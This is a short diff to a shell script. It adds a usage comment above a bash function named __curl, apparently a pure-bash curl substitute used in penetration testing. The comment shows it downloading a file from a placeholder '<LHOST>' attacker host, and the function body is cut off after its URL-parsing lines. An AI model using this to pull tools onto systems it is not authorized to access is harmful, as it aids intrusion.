@@ -1,3 +1,5 @@
+# __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
+
 function __curl() {
   read proto server path <<<$(echo ${1//// })
   DOC=/${path// //}
